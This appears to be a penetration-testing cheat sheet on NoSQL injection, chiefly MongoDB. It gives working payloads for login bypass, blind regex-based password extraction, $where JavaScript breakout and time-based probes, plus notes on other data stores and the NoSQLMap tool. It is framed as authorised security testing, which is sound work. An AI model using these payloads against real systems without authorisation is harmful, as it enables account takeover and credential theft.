# NoSQL Injection (MongoDB and friends)

NoSQLi in APIs is mostly **structural**: the client controls JSON types, and
the server passes the parsed object straight into a query. No quotes to break
— you inject *operators*.

## Operator injection (JSON body)

Baseline login:

```json
{"username": "admin", "password": "guess"}
```

Substitutions to try on every string field (one at a time, then combined):

| Payload | Effect |
|---|---|
| `{"$ne": null}` | matches any non-null value — classic auth bypass |
| `{"$ne": "x"}` | same, when null is rejected |
| `{"$gt": ""}` | matches any string |
| `{"$regex": ".*"}` | matches anything; the workhorse for blind extraction |
| `{"$in": ["admin", "root", "administrator"]}` | targeted guess |
| `{"$exists": true}` | field-presence logic flips |

Auth bypass example:

```json
{"username": "admin", "password": {"$ne": null}}
```

A `200` + session token where baseline was `401` is a confirmed CWE-943
finding — you logged in without the password. To bypass into an *unknown*
account: `{"username": {"$ne": null}, "password": {"$ne": null}}` (returns the
first user, often admin).

## URL-encoded operator form (query/form params)

PHP/Express/qs-style parsers turn bracket syntax into nested objects:

```
GET /api/users?username[$ne]=x&password[$ne]=x
POST body: username[$ne]=x&password[$ne]=x   (application/x-www-form-urlencoded)
```

Also try `username[$regex]=^adm` and `username[$exists]=true`. If brackets are
rejected, URL-encode them: `username%5B%24ne%5D=x`.

## Blind boolean extraction with `$regex`

When the response differs between match/no-match (login success, "user
exists", result count), extract character by character:

```json
{"username": "admin", "password": {"$regex": "^a"}}      → match? first char is 'a'
{"username": "admin", "password": {"$regex": "^ab"}}     → walk the prefix
{"username": "admin", "password": {"$regex": "^a.{7}$"}} → length oracle
```

Escape regex metachars in extracted values. The `$in`/`$nin` pair gives a
binary-search variant. Stop at a short prefix — enough to prove extraction.

## `$where` injection (string context)

When input lands inside a `$where` JavaScript string, classic string-breakout
applies:

```
' || '1'=='1
'; return true; var x='
' || this.password.match(/^a/) || '
```

Time-based blind (server-side JS):

```json
{"username": {"$where": "sleep(5000) || true"}}
```

or in string context: `'; sleep(5000); var x='`. A reliable 5s delta confirms.
`$where`, `$function`, and `mapReduce` are the JS sinks; recent MongoDB
disables them by default — absence of delay is not proof of absence of
operator injection.

## Other stores

- **CouchDB**: Mango selectors — same `$gt`/`$regex` operator model via
  `_find`.
- **Elasticsearch**: injection into `query_string` syntax (`*`, `OR`,
  field:value); script fields (`"script": {"source": "..."}` if the API
  forwards raw query DSL).
- **Redis** (via EVAL/injection into commands): CRLF-split command injection
  when input reaches the RESP protocol.

## nosqlmap

```
git clone https://github.com/codingo/NoSQLMap && python nosqlmap.py
```

Menu-driven: set target host/port, URI, and the POST body with the attack
parameter; option `2` (NoSQL DB Access Attacks) for direct Mongo access,
option `3` (NoSQL Web App attacks) for operator/`$where` injection against the
HTTP endpoint, including timing and auth-bypass checks. It's an aid — the JSON
operator substitutions above are faster to run by hand or via
`inject_probe.py --classes nosqli` and easier to evidence.

Finding: CWE-943 (NoSQLi) — evidence is the operator-payload request plus the
bypassed/overmatched response. Endpoint → `exploited` on auth bypass or data
extraction; `tested` if operators are rejected with proper type validation.
